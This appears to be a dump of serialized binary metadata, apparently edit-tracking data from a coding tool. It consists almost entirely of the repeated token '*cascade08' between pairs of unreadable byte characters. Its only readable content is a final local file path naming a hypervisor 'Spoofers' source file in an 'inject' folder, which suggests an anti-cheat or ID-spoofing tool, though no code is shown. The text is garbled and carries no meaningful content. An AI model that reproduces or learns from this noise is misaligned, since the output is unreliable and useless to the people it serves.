¥O¦O*cascade08¦O§O *cascade08§O¨O*cascade08¨O¬O *cascade08¬O¯O*cascade08¯O±O *cascade08±O³O*cascade08³OµO *cascade08µO¿O*cascade08¿OÅO *cascade08ÅOÆO*cascade08ÆOÇO *cascade08ÇOÉO*cascade08ÉOÎO *cascade08ÎOÒO*cascade08ÒOÓO *cascade08ÓOÕO*cascade08ÕOãO *cascade08ãOäO*cascade08äOêO *cascade08êOëO*cascade08ëOìO *cascade08ìOïO*cascade08ïOõO *cascade08õOüO*cascade08üO€P *cascade08€P…P*cascade08…PP *cascade08PP*cascade08P”P *cascade08”P•P*cascade08•PœP *cascade08œPP*cascade08PŸP *cascade08ŸP¡P*cascade08¡P£P *cascade08£P¤P*cascade08¤P§P *cascade08§P¬P*cascade08¬P±P *cascade08±P´P*cascade08´PÃP *cascade08ÃPÄP*cascade08ÄPÅP *cascade08ÅPÆP*cascade08ÆPÌP *cascade08ÌPÒP*cascade08ÒPÕP *cascade08ÕPØP*cascade08ØPÚP *cascade08ÚPİP*cascade08İPßP *cascade08ßPàP*cascade08àPèP *cascade08èPéP*cascade08éPêP *cascade08êPëP*cascade08ëPñP *cascade08ñPòP*cascade08òPóP *cascade08óPõP*cascade08õPüP *cascade08üP€Q*cascade08€QQ *cascade08Q‚Q*cascade08‚QQ *cascade08QQ*cascade08QQ *cascade08QQ*cascade08Q™Q *cascade08™QšQ*cascade08šQŸQ *cascade08ŸQ Q*cascade08 Q¢Q *cascade08¢Q£Q*cascade08£Q¤Q *cascade08¤Q¥Q*cascade08¥Q¦Q *cascade08¦Q§Q*cascade08§Q²Q *cascade08²Q³Q*cascade08³Q´Q *cascade08´QµQ*cascade08µQ»Q *cascade08»Q¼Q*cascade08¼Q¾Q *cascade08¾Q¿Q*cascade08¿QÁQ *cascade08ÁQÃQ*cascade08ÃQÄQ *cascade08ÄQÅQ*cascade08ÅQÇQ *cascade08ÇQÈQ*cascade08ÈQËQ *cascade08ËQÌQ*cascade08ÌQ×Q *cascade08×QØQ*cascade08ØQàQ *cascade08àQåQ*cascade08åQéQ *cascade08éQëQ*cascade08ëQñQ *cascade08ñQòQ*cascade08òQüQ *cascade08üQıQ*cascade08ıQşQ *cascade08şQÿQ*cascade08ÿQR *cascade08R‚R*cascade08‚R…R *cascade08…RŠR*cascade08ŠRR *cascade08R‘R*cascade08‘R’R *cascade08’R•R*cascade08•R™R *cascade08™RšR*cascade08šRŸR *cascade08ŸR R*cascade08 R¬R *cascade08¬R­R*cascade08­R®R *cascade08®R³R*cascade08³R¹R *cascade08¹R¾R*cascade08¾RÇR *cascade08ÇRÈR*cascade08ÈRÓR *cascade08ÓRÙR*cascade08ÙRàR *cascade08àRáR*cascade08áRâR *cascade08âRçR*cascade08çRïR *cascade08ïRñR*cascade08ñRûR *cascade08ûRüR*cascade08üR‡S *cascade08‡S‰S*cascade08‰SS *cascade08SS*cascade08S”S *cascade08”S•S*cascade08•S–S *cascade08–SšS*cascade08šS£S *cascade08£S¥S*cascade08¥S¯S *cascade08¯S°S*cascade08°S»S *cascade08»S½S*cascade08½SÊS *cascade08ÊSÏS*cascade08ÏSéS *cascade08éSêS*cascade08êSíT *cascade08íTõT*cascade08õT”U *cascade08”UªU*cascade08ªUóU *cascade08óU€V*cascade08€VŸV *cascade08ŸVµV*cascade08µV·W *cascade08·W¿W*cascade08¿W‰X *cascade08‰X•X*cascade08•XßX *cascade08ßXëX*cascade08ëXŠY *cascade08ŠY Y*cascade08 YØZ *cascade08ØZâZ*cascade08âZÎ[ *cascade08Î[ß[*cascade08ß[\ *cascade08\¡\*cascade08¡\«] *cascade08«]µ]*cascade08µ]¡^ *cascade08¡^±^*cascade08±^ş^ *cascade08ş^–_*cascade08–_Ã_ *cascade08Ã_Ó_*cascade08Ó_ ` *cascade08 `¸`*cascade08¸`å` *cascade08å`õ`*cascade08õ`Âa *cascade08ÂaÚa*cascade08Úab *cascade08bµb*cascade08µbËb *cascade08ËbÔb*cascade08Ôb€c *cascade08€cc*cascade08c°c *cascade08°c¿c*cascade08¿cŒd *cascade08Œd¤d*cascade08¤dİd *cascade08İdìd*cascade08ìd˜e *cascade08˜e¦e*cascade08¦eÒe *cascade08Òeëe*cascade08ëe­f *cascade08­fÅf*cascade08Åfüf *cascade08üfg*cascade08gİg *cascade08İgõg*cascade08õg®h *cascade08®h¼h*cascade08¼hèh *cascade08èhi*cascade08iÃi *cascade08ÃiÛi*cascade08Ûi’j *cascade08’j¦j*cascade08¦jój *cascade08ój‹k*cascade08‹k·k *cascade08·kÆk*cascade08Ækök *cascade08ök„l*cascade08„lÑl *cascade08Ñlèl*cascade08èlşl *cascade08şlŒm*cascade08ŒmÙm *cascade08Ùmğm*cascade08ğm†n *cascade08†n”n*cascade08”nán *cascade08ánøn*cascade08øno *cascade08oœo*cascade08œoéo *cascade08éo€p*cascade08€p—p *cascade08—p¤p*cascade08¤pÛp *cascade08Ûpòp*cascade08òp´q *cascade08´qÌq*cascade08Ìqr *cascade08r¦r*cascade08¦rèr *cascade08èr€s*cascade08€sÂs *cascade08ÂsÚs*cascade08ÚsØt *cascade08Øtçt*cascade08çtÊu *cascade08ÊuÙu*cascade08Ùu¼v *cascade08¼vËv*cascade08Ëv®w *cascade08®w½w*cascade08½w×w *cascade08×wáw*cascade08áwìw *cascade08ìw÷w*cascade08÷wÄx *cascade08ÄxÜx*cascade08Üx‰y *cascade08‰y™y*cascade08™yæy *cascade08æyşy*cascade08şyîz *cascade08îz‰{*cascade08‰{| *cascade08|®|*cascade08®|³| *cascade08³|´|*cascade08´|…} *cascade08…}}*cascade08}£} *cascade08£}¤}*cascade08¤}Ğ} *cascade08Ğ}Ó}*cascade08Ó}Í~ *cascade08Í~Î~*cascade08Î~Ü *cascade08ÜÜ*cascade08Üî€ *cascade08î€ï€*cascade08ï€å *cascade08åæ*cascade08æç *cascade08çé*cascade08éë *cascade08ëñ*cascade08ñú *cascade08ú‚*cascade08‚‚ *cascade08‚‚*cascade08‚™‚ *cascade08™‚›‚*cascade08›‚ ‚ *cascade08 ‚¡‚*cascade08¡‚¢‚ *cascade08¢‚£‚*cascade08£‚©‚ *cascade08©‚¬‚*cascade08¬‚®‚ *cascade08®‚¯‚*cascade08¯‚·‚ *cascade08·‚»‚*cascade08»‚Æ‚ *cascade08Æ‚Õ‚*cascade08Õ‚Û‚ *cascade08Û‚á‚*cascade08á‚ä‚ *cascade08ä‚æ‚*cascade08æ‚ì‚ *cascade08ì‚û‚*cascade08û‚ÿƒ *cascade08ÿƒ„*cascade08„Ë„ *cascade08Ë„Ì„*cascade08Ì„×„ *cascade08×„Ø„*cascade08Ø„á„ *cascade08á„ã„*cascade08ã„è„ *cascade08è„é„*cascade08é„ê„ *cascade08ê„ë„*cascade08ë„õ„ *cascade08õ„ö„*cascade08ö„û„ *cascade08û„ş„*cascade08ş„†… *cascade08†…ˆ…*cascade08ˆ…’… *cascade08’…“…*cascade08“…˜… *cascade08˜…™…*cascade08™…š… *cascade08š…›…*cascade08›…… *cascade08……*cascade08… … *cascade08 …¢…*cascade08¢…£… *cascade08£…¤…*cascade08¤…¥… *cascade08¥…§…*cascade08§…¨… *cascade08¨…ª…*cascade08ª…«… *cascade08«…¬…*cascade08¬…­… *cascade08­…®…*cascade08®…¿… *cascade08¿…Ã…*cascade08Ã…Å… *cascade08Å…Ê…*cascade08Ê…Ì… *cascade08Ì…Î…*cascade08Î…Ğ… *cascade08Ğ…Ñ…*cascade08Ñ…Ò… *cascade08Ò…Ó…*cascade08Ó…Ö… *cascade08Ö…×…*cascade08×…Ø… *cascade08Ø…Û…*cascade08Û…ê… *cascade08ê…ë…*cascade08ë…ô… *cascade08ô…õ…*cascade08õ…ÿ… *cascade08ÿ…€†*cascade08€†Š† *cascade08Š††*cascade08†–† *cascade08–†˜†*cascade08˜†Â† *cascade08Â†Ç†*cascade08Ç†¸‡ *cascade08¸‡¸‡*cascade08¸‡éˆ *cascade08éˆêˆ*cascade08êˆëˆ *cascade08ëˆíˆ*cascade08íˆîˆ *cascade08îˆğˆ*cascade08ğˆñˆ *cascade08ñˆòˆ*cascade08òˆóˆ *cascade08óˆöˆ*cascade08öˆøˆ *cascade08øˆÿˆ*cascade08ÿˆ‰ *cascade08‰ƒ‰*cascade08ƒ‰„‰ *cascade08„‰‡‰*cascade08‡‰‰‰ *cascade08‰‰‹‰*cascade08‹‰š‰ *cascade08š‰œ‰*cascade08œ‰¥‰ *cascade08¥‰§‰*cascade08§‰°‰ *cascade08°‰±‰*cascade08±‰³‰ *cascade08³‰µ‰*cascade08µ‰¹‰ *cascade08¹‰À‰*cascade08À‰Ä‰ *cascade08Ä‰Å‰*cascade08Å‰Æ‰ *cascade08Æ‰É‰*cascade08É‰Ñ‰ *cascade08Ñ‰Ó‰*cascade08Ó‰İ‰ *cascade08İ‰Ş‰*cascade08Ş‰å‰ *cascade08å‰é‰*cascade08é‰ê‰ *cascade08ê‰ú‰*cascade08ú‰¬‹ *cascade08¬‹±‹*cascade08±‹²‹ *cascade08²‹İ‹*cascade08İ‹Ş‹ *cascade08Ş‹ş‹*cascade08ş‹ÿ‹ *cascade08ÿ‹‡Œ*cascade08‡ŒŒ *cascade08Œ‘Œ*cascade08‘ŒšŒ *cascade08šŒ§Œ*cascade08§Œ°Œ *cascade08°Œ²Œ*cascade08²Œ³Œ *cascade08³Œ´Œ*cascade08´ŒµŒ *cascade08µŒÃŒ*cascade08ÃŒÅŒ *cascade08ÅŒÌŒ*cascade08ÌŒÎŒ *cascade08ÎŒäŒ*cascade08äŒóŒ *cascade08óŒıŒ*cascade08ıŒÿŒ *cascade08ÿŒˆ*cascade08ˆ­ *cascade08­Ü*cascade08Üú *cascade08úª*cascade08ª¿ *cascade08¿Ã*cascade08ÃÄ *cascade08ÄÅ*cascade08ÅÆ *cascade08ÆÊ*cascade08ÊÍ *cascade08ÍÏ*cascade08ÏÓ *cascade08Ó*cascade08‘ *cascade08‘±*cascade08±¶ *cascade08¶Ô*cascade08Ôà *cascade08àñ*cascade08ñô *cascade08ôı*cascade08ış *cascade08şƒ*cascade08ƒ„ *cascade08„†*cascade08†‡ *cascade08‡Š*cascade08Š‹ *cascade08‹*cascade08 *cascade08¦*cascade08¦§ *cascade08§ä*cascade08äå *cascade08åì*cascade08ìí *cascade08íø*cascade08øù *cascade08ùş*cascade08şÿ *cascade08ÿ‚‘*cascade08‚‘ƒ‘ *cascade08ƒ‘‡‘*cascade08‡‘‰‘ *cascade08‰‘Ÿ‘*cascade08Ÿ‘ ‘ *cascade08 ‘¡‘*cascade08¡‘¢‘ *cascade08¢‘®‘*cascade08®‘¯‘ *cascade08¯‘¿‘*cascade08¿‘Ù‘ *cascade08Ù‘ñ‘*cascade08ñ‘ş‘ *cascade08ş‘‹’*cascade08‹’Œ’ *cascade08Œ’—’*cascade08—’Ÿ’ *cascade08Ÿ’¨’*cascade08¨’©’ *cascade08©’¬’*cascade08¬’±’ *cascade08±’²’*cascade08²’³’ *cascade08³’´’*cascade08´’µ’ *cascade08µ’¿’*cascade08¿’À’ *cascade08À’Â’*cascade08Â’Ã’ *cascade08Ã’Å’*cascade08Å’Æ’ *cascade08Æ’Î’*cascade08Î’Ï’ *cascade08Ï’Ñ’*cascade08Ñ’Ò’ *cascade08Ò’Õ’*cascade08Õ’×’ *cascade08×’Ú’*cascade08Ú’Û’ *cascade08Û’İ’*cascade08İ’Ş’ *cascade08Ş’ó’*cascade08ó’ô’ *cascade08ô’ø’*cascade08ø’ö” *cascade08ö”ú”*cascade08ú”ÿ” *cascade08ÿ”€•*cascade08€•«• *cascade08«•¹•*cascade08¹•ß• *cascade08ß•à•*cascade08à•á• *cascade08á•å•*cascade08å•æ• *cascade08æ•ì•*cascade08ì•í• *cascade08í•ò•*cascade08ò•ó• *cascade08ó•ö•*cascade08ö•÷• *cascade08÷•ş•*cascade08ş•Š— *cascade08Š——*cascade08—‘— *cascade08‘—•—*cascade08•——— *cascade08——›—*cascade08›—œ— *cascade08œ——*cascade08—— *cascade08—¤—*cascade08¤—Ã— *cascade08Ã—È—*cascade08È—Ï— *cascade08Ï—Ñ—*cascade08Ñ—Ø— *cascade08Ø—Ú—*cascade08Ú—Û— *cascade08Û—Ş—*cascade08Ş—ß— *cascade08ß—á—*cascade08á—â— *cascade08â—é—*cascade08é—ê— *cascade08ê—ğ—*cascade08ğ—ó— *cascade08ó—ö—*cascade08ö—‚š *cascade08‚šƒš*cascade08ƒš°š *cascade08°š±š*cascade08±šÄš *cascade08ÄšÅš*cascade08ÅšÏš *cascade08ÏšÓš*cascade08ÓšÔš *cascade08ÔšÕš*cascade08ÕšÖš *cascade08Öš×š*cascade08×š¼Ÿ *cascade08¼Ÿ½Ÿ*cascade08½ŸúŸ *cascade08úŸûŸ*cascade08ûŸ¯  *cascade08¯ ³ *cascade08³ ´  *cascade08´ µ *cascade08µ ¶  *cascade08¶ · *cascade08· ¤ *cascade08¤¤*cascade08¤Ù¤ *cascade08Ù¤Û¤*cascade08Û¤à¤ *cascade08à¤á¤*cascade08á¤ä¤ *cascade08ä¤å¤*cascade08å¤™¥ *cascade08™¥š¥*cascade08š¥²¥ *cascade08²¥´¥*cascade08´¥€¦ *cascade08€¦¦*cascade08¦¢¦ *cascade08¢¦£¦*cascade08£¦Ñ¦ *cascade08Ñ¦Õ¦*cascade08Õ¦Ö¦ *cascade08Ö¦×¦*cascade08×¦Ø¦ *cascade08Ø¦Ù¦*cascade08Ù¦ï¦ *cascade08ï¦ğ¦*cascade08ğ¦ö¦ *cascade08ö¦ú¦*cascade08ú¦û¦ *cascade08û¦ü¦*cascade08ü¦ı¦ *cascade08ı¦ş¦*cascade08ş¦½§ *cascade08½§¾§*cascade08¾§³´ *cascade08³´´´*cascade08´´–µ *cascade08–µ—µ*cascade08—µÀµ *cascade08ÀµÄµ*cascade08ÄµÅµ *cascade08ÅµÆµ*cascade08ÆµÇµ *cascade08ÇµÈµ*cascade08ÈµÂ¶ *cascade08Â¶Ã¶*cascade08Ã¶ï¶ *cascade08ï¶ğ¶*cascade08ğ¶š¸ *cascade08š¸¸*cascade08¸ ¸ *cascade08 ¸¤¸*cascade08¤¸º *cascade08º†º*cascade08†ºˆº *cascade08ˆºº*cascade08ºı¼ *cascade08ı¼ş¼*cascade08ş¼ƒ½ *cascade08ƒ½Š½*cascade08Š½’½ *cascade08’½”½*cascade08”½—½ *cascade08—½ ½*cascade08 ½¢½ *cascade08¢½¨½*cascade08¨½©½ *cascade08©½¬½*cascade08¬½²½ *cascade08²½´½*cascade08´½¶½ *cascade08¶½»½*cascade08»½¼½ *cascade08¼½¾½*cascade08¾½¿½ *cascade08¿½Â½*cascade08Â½Ä½ *cascade08Ä½Å½*cascade08Å½Ç½ *cascade08Ç½Í½*cascade08Í½Î½ *cascade08Î½×½*cascade08×½à½ *cascade08à½â½*cascade08â½é½ *cascade08é½ê½*cascade08ê½í½ *cascade08í½ï½*cascade08ï½ò½ *cascade08ò½ó½*cascade08ó½õ½ *cascade08õ½ù½*cascade08ù½™¾ *cascade08™¾š¾*cascade08š¾µ¾ *cascade08µ¾¸¾*cascade08¸¾Å¾ *cascade08Å¾Æ¾*cascade08Æ¾Ô¾ *cascade08Ô¾Õ¾*cascade08Õ¾ç¾ *cascade08ç¾è¾*cascade08è¾é¾ *cascade08é¾ë¾*cascade08ë¾ì¾ *cascade08ì¾í¾*cascade08í¾÷¾ *cascade08÷¾ù¾*cascade08ù¾„¿ *cascade08„¿†¿*cascade08†¿•¿ *cascade08•¿—¿*cascade08—¿™¿ *cascade08™¿¡¿*cascade08¡¿¢¿ *cascade08¢¿¦¿*cascade08¦¿§¿ *cascade08§¿©¿*cascade08©¿ª¿ *cascade08ª¿«¿*cascade08«¿¯¿ *cascade08¯¿²¿*cascade08²¿¡À *cascade08¡À¥À*cascade08¥À§À *cascade08§À«À*cascade08«ÀÒÀ *cascade08ÒÀÙÀ*cascade08ÙÀÛÀ *cascade08ÛÀÜÀ*cascade08ÜÀİÀ *cascade08İÀëÀ*cascade08ëÀíÀ *cascade08íÀÁ*cascade08Á™Á *cascade08™ÁšÁ*cascade08šÁ›Á *cascade08›ÁŸÁ*cascade08ŸÁ Á *cascade08 Á§Á*cascade08§ÁèÁ *cascade08èÁÀÂ*cascade08ÀÂ÷Â *cascade0820file:///C:/inject/Spoofers/SVMHypervisorV5_8.cpp